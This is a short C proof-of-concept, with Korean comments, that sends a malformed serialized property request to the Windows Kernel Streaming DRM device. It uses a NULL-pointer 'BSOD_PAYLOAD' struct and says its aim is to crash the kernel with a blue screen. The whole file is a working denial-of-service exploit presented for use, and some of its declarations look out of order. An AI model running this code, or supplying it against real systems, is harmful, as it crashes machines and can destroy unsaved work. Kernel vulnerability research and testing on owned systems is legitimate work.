#define UNICODE 1
#define _UNICODE 1

#include <windows.h>
#include <winioctl.h>
#include <initguid.h>
#include <ks.h>
#include <ksmedia.h>
#include <setupapi.h>
#include <stdio.h>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ksuser.lib")

// NULL Dereference or Access Violation 유도용
#pragma pack(1)
typedef struct _BSOD_PAYLOAD {
    char pad[0x40];             // 적당한 패딩 (커널 내부 offset 맞춤)
    void* InvalidPointer;       // 커널이 이 포인터 역참조 → BSOD
} BSOD_PAYLOAD;

// 장치 열기
HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(&categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
    return (hr == NOERROR) ? hDevice : INVALID_HANDLE_VALUE;
}

// KsOpenDefaultDevice 함수 정의
extern "C" {
    __declspec(dllimport)
    HRESULT WINAPI KsOpenDefaultDevice(
        const GUID* Category,
        ACCESS_MASK Access,
        PHANDLE DeviceHandle
    );
}

int wmain() {
    HANDLE hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open DRM device\n");
        return 1;
    }

    // 입력 버퍼 구성
    UCHAR inBuf[sizeof(KSPROPERTY)] = { 0 };
    KSPROPERTY* prop = (KSPROPERTY*)inBuf;
    prop->Set = KSPROPSETID_DrmAudioStream;
    prop->Id = 0;
    prop->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;

    // 출력 버퍼 구성 (취약 구조체 포함)
    UCHAR outBuf[
        sizeof(KSPROPERTY_SERIALHDR) +
        sizeof(KSPROPERTY_SERIAL) +
        sizeof(BSOD_PAYLOAD)
    ] = { 0 };

    KSPROPERTY_SERIALHDR* hdr = (KSPROPERTY_SERIALHDR*)outBuf;
    KSPROPERTY_SERIAL* serial = (KSPROPERTY_SERIAL*)(hdr + 1);
    BSOD_PAYLOAD* payload = (BSOD_PAYLOAD*)(serial + 1);

    // 직렬화 헤더 설정
    hdr->PropertySet = KSPROPSETID_DrmAudioStream;
    hdr->Count = 1;

    serial->PropertyLength = sizeof(BSOD_PAYLOAD);
    serial->Id = 0;
    serial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    serial->PropTypeSet.Id = 0x45;
    serial->PropTypeSet.Flags = 0;

    // 크래시 유도: NULL 포인터 역참조
    payload->InvalidPointer = NULL;

    printf("[*] Sending malformed payload to trigger BSOD...\n");

    DeviceIoControl(
        hDevice,
        IOCTL_KS_PROPERTY,
        inBuf, sizeof(inBuf),
        outBuf, sizeof(outBuf),
        NULL, NULL
    );

    printf("[*] If the system crashed, the vulnerability likely still exists.\n");

    CloseHandle(hDevice);
    return 0;
}

